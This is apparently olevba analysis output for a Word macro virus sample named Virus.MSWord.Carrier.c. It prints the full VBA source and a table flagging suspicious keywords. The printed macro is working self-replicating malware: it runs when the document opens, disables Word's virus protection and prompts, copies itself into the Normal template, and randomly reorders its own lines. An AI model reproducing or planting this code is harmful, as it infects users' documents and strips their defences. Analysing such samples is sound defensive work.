olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Carrier.c-3ad234449d9119b6e4441a62f54640669a30d5d9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Carrier.c-3ad234449d9119b6e4441a62f54640669a30d5d9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
GoTo 10
10 Application.EnableCancelKey = wdCancelDisabled: GoTo 20
20 Options.VirusProtection = False: GoTo 30
30 Options.SaveNormalPrompt = False: GoTo 40
40 Application.CommandBars("Tools").Controls(12).Visible = False: GoTo 50
50 Set ActCarrier = ActiveDocument.VBProject.VBComponents(1).CodeModule: GoTo 60
60 Set NormCarrier = NormalTemplate.VBProject.VBComponents(1).CodeModule: GoTo 70
70 NI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1): GoTo 80
80 AI = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1): GoTo 90
90 If UCase(NI) = "ON ERROR RESUME NEXT" Then NormInstalled = True Else NormInstalled = False: GoTo 100
100 If UCase(AI) = "ON ERROR RESUME NEXT" Then ActInstalled = True Else ActInstalled = False: GoTo 110
110 If NormInstalled = True And ActInstalled = True Then Exit Sub: GoTo 120
120 If NormInstalled = False Then: Set Infection = NormCarrier: Set Carrier = ActCarrier: Else: Set Infection = ActCarrier: Set Carrier = NormCarrier: GoTo 130
130 IL = Carrier.CountOfLines: GoTo 140
140 With Carrier: VirCode = .Lines(1, .CountOfLines): End With: GoTo 150
150 With Infection: .DeleteLines 1, Infection.CountOfLines: .InsertLines 1, VirCode: End With: GoTo 160
160 Randomize Timer: GoTo 170
170 For i = 4 To IL - 1: RL = Int(Rnd * (IL - 5)) + 4: GCL = Infection.Lines(i, 1): Infection.DeleteLines i, 1: Infection.InsertLines RL, GCL: Next i: GoTo 180
180 WrittenBy = "Lord_Arz  [SOS] {F#S}": VirusN = "V_Man": Exit Sub
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

